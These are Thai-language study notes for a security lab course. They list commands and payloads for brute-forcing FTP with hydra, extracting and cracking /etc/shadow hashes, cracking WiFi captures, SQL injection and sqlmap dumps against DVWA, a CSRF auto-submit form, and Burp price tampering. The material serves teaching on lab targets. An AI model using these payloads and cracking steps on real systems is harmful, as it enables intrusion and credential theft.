L7 · Password Cracking — Lab Stepsโจทย์แนว: เติมคำสั่งแคร็ก + บอกวัตถุประสงค์ flag
  1. เตรียม wordlist: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz · สร้างเอง: crunch 4 4 abcdefghijklmnopqrstuvwxyz -o wordlist_4char.txt (หรือใส่ template -t %%%%%%-%%%%%%)
  2. เตรียม user/pass list: nano users.txt + nano passwords.txt (หรือ cp users.txt passwords.txt)
  3. Online brute FTP: hydra -L users.txt -P passwords.txt <Target_IP> ftp
  4. ยืนยันการเข้าถึง: ftp <Target_IP> → ls · pwd
  5. ดึงแฮชจากเป้า: sudo cat /etc/shadow → บันทึกเป็นไฟล์ nano meta_shadow (หรือ sudo cat /etc/shadow > pass_shadow)
  6. รวม passwd+shadow: unshadow passwordmeta2.txt shadowmeta2.txt > hashes.txt + ล้างผลเก่า rm ~/.john/john.pot
  7. แคร็กด้วย John: john --format=crypt meta_shadow หรือ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt meta_shadow
  8. ดูรหัสที่ถอดได้: john --show meta_shadow
  9. แคร็กด้วย Hashcat: cp meta_shadow meta_shadow_cut → hashcat -m 500 -a 0 meta_shadow_cut /usr/share/wordlists/rockyou.txt --potfile-disable (เพิ่ม rule: -r /usr/share/hashcat/rules/best66.rule)
  10. WiFi — WEP: tar -xf wepchallenge.tar.gz → aircrack-ng -b e4:7d:eb:31:10:9a wepchallenge*.cap
  11. WiFi — WPA/WPA2: aircrack-ng -w /usr/share/wordlists/rockyou.txt -b e4:7d:eb:31:10:9a wpachallenge*.cap
  12. ฝึกเพิ่ม: adduser test1 (รหัส 12345) · adduser test2 (qwerty) → แคร็ก pass_shadow ที่คัดลอกมา
คำสั่ง / flagวัตถุประสงค์ (ข้อสอบถามบ่อย)
hydra -L / -Pไฟล์ list ของ username / password (ตัวใหญ่ = list) — -l/-p = ค่าเดี่ยว
john --format=cryptระบุชนิดแฮชให้ตรง shadow (DES=crypt · $1$=md5crypt · $6$=sha512crypt)
john --wordlist=…โจมตีแบบ Dictionary จาก wordlist ที่กำหนด
john --showแสดงรหัสผ่านที่แคร็กสำเร็จทั้งหมด
hashcat -m 500เลือกชนิดแฮช: 500=MD5-crypt · 0=MD5 · 100=SHA-1 · 3200=bcrypt
hashcat -a 0โหมดโจมตี: 0=Straight/Dictionary · 1=Combination · 3=Brute-force · 6/7=Hybrid · 9=Association
--potfile-disableไม่ใช้ potfile เดิม — แคร็กใหม่ทั้งหมด
-r best66.ruleใช้ rule แปลงคำใน wordlist (เพิ่มโอกาสเจอ)
unshadowรวม /etc/passwd + /etc/shadow เป็นไฟล์เดียวให้ john อ่าน

💡 จุดพลาดบ่อย: -L/-P ตัวใหญ่ = list · ตัวเล็ก = ค่าเดียว · ถ้าไม่แตก rockyou.txt.gz ก่อน จะหาไฟล์ไม่เจอ · ต้องรู้ชนิดแฮชก่อนเลือก -m/--format

L8 · SQL Injection + sqlmap — StepsDVWA → พิสูจน์ → ดัมป์ข้อมูล

Setup: sudo apt install dvwa → dvwa-start → login admin/password → ตั้ง difficulty ที่หน้า DVWA Security (Low/Medium/High/Impossible)

Payload ตามสถานการณ์ (โจทย์ → เติม payload)
ต้องการอะไรPayload
ทดสอบ tautology (ได้ทุกแถว)%' or '0'='0 · ' or 1=1#
ปิด query ท้าย (comment)MySQL: # · -- (ต้องมี space) · /* */ — DB อื่น: --
หาจำนวนคอลัมน์1' ORDER BY 3# ไล่เพิ่มจน error · หรือ 1' UNION SELECT null,null --
ดูชื่อ table/column ทั้งหมด%' UNION SELECT table_name,column_name FROM information_schema.columns #
ลิสต์ตารางใน DB' union select table_name,null from information_schema.tables#
ดัมป์ user + password%' UNION SELECT user, password FROM users #
Blind — ตรวจจริง/เท็จ2' AND 1=1# (จริง) vs 2' AND 1=0# (เท็จ)
Blind — วัดเวลาตอบสนอง2' AND SLEEP(5)# — หน้าค้าง 5 วิ = คำสั่งรันจริง
Blind — หาความยาวชื่อ DB2' AND LENGTH(DATABASE())=4# (ไล่ค่าจน behavior เปลี่ยน)
sqlmap — ขั้นตอน (ให้ shell มา → เติม flag)
  1. เอา session: F12 → Application (Chrome) / Storage (Firefox) → Cookies → PHPSESSID
  2. ยิงพื้นฐาน: sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=<session_id>"
  3. ฟอร์ม POST: เพิ่ม --data="id=1&Submit=Submit" -p id
  4. ไล่ดัมป์: --dbs → -D dvwa --tables → -D dvwa -T users --columns → -D dvwa -T users --dump
  5. ดูผลย้อนหลัง: /home/kali/.local/share/sqlmap/output/<IP> → sqlitebrowser session.sqlite
flagวัตถุประสงค์
-uระบุ URL เป้าหมายที่มี parameter ต้องทดสอบ
--cookie=แนบ session cookie (DVWA บังคับ login — ต้องมี PHPSESSID)
--data= + -pยิงแบบ POST (ระบุ body) + เจาะจง parameter ที่ทดสอบ
--dbs / -Dแสดงรายชื่อ database ทั้งหมด / เลือก database เป้าหมาย
--tables / --columns / --dumpแสดงตาราง / คอลัมน์ / ดึงข้อมูลจริงออกมา

💡 จุดพลาดบ่อย: ค่า security= ใน cookie ต้องตรงกับ level ที่ตั้งใน DVWA · เป้าที่ต้อง login ต้องมี --cookie เสมอ

L8 · CSRF · XSS · Burp Suite — Stepsโจมตีฝั่ง client + intercept request
CSRF — DVWA (Low) + PortSwigger
  1. URL เปลี่ยนรหัสผ่าน (GET): http://<IP>/dvwa/vulnerabilities/csrf/?password_new=kmutnb&password_conf=kmutnb&Change=Change# — สังเกต: ไม่มี CSRF token → โจมตีได้
  2. สร้างหน้า exploit ให้ฟอร์ม auto-submit:

<form method="POST" action="https://<LAB-ID>.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="evil@hacker.net">
</form> · <script>document.forms[0].submit();</script>

→ วางใน exploit server → Store → Deliver to victim

Burp Suite — ติดตั้ง + intercept + repeater
  1. ติดตั้ง (Community): chmod +x burpsuite_community_linux_v2025_7_2.sh → ./burpsuite_community_linux_v2025_7_2.sh · หรือ sudo apt install burpsuite -y + Burp's browser
  2. Firefox + ส่วนขยาย FoxyProxy สลับ proxy ไป Burp
  3. ติดตั้ง CA cert (สำหรับ HTTPS): เปิด http://burp → CA Certificate → import cacert.der
  4. Intercept on → ทำ action บนเว็บ (เช่น add to cart) → ดัก request
  5. คลิกขวา → Send to Repeater → แก้ค่า (เช่น price=133700 → 1300) → Send
  6. กลับเว็บ → Refresh → ราคาใหม่มีผล → place order ✓ (Business Logic Flaw — server เชื่อค่าจาก client)

💡 จำ: Burp = intercept ระหว่าง browser↔server แก้ request ก่อนส่งจริง · CA cert จำเป็นเฉพาะ HTTPS

คำสั่งวัตถุประสงค์ (ออกสอบบ่อย)

strings fดึงข้อความ readable จาก binary (หา hint/flag)

gdb ./fdebug ทีละบรรทัด ตั้ง breakpoint ดูหน่วยความจำ
objdump -d ./fdisassemble — อ่าน assembly (หา cmp/je/jne)
